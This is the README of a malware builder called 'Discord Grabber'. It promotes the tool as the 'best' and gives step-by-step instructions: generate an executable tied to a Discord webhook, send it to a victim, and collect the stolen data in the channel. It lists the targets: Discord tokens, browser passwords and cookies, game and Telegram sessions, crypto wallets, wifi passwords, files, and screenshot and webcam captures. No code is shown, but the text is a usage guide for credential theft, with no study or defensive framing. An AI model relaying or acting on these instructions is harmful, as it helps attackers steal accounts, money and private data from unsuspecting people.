                                                                          DISCORD GRABBER

Best Discord Grabber Ever Made!

How To Use: Firstly Simply Run The builder.exe File (If It Closes After Some Seconds Your Computer Is Too Slow So It Automatically Closes The Exe).
Then, Pick The First Option And After That Go To Discord, Make a Server, Go To A Text Channels' Settings, Click On Integrations, Create Webhook, Click On The Webhook And 
Then Copy Webhook URL. Now Go Back To The Program And Paste The Webhook URL. Then A New Exe File Will Be Created On The dist Folder. Get That And Send It To Someone And 
Then BOOM! When You Go Back To The Channel You Made The Webhook To Every Single Password And Lots Of Other Stuff Will Be Sent There.

What Can It Steal From The Victim:

• Steals Discord Tokens.
• Steals Steam Session.
• Steals Epic Session.
• Steals Uplay Session.
• Steals Passwords From Many Browsers.
• Steals Cookies From Many Browsers.
• Steals History From Many Browsers.
• Steals Autofills From Many Browsers.
• Steals Minecraft Session Files.
• Steals Telegram Session Files.
• Steals Crypto Wallets.
• Steals Roblox Cookies.
• Steals Growtopia Session.
• Steals IP Information.
• Steals System Info.
• Steals Saved Wifi Passwords.
• Steals Common Files.
• Captures Screenshot.
• Captures Webcam Image.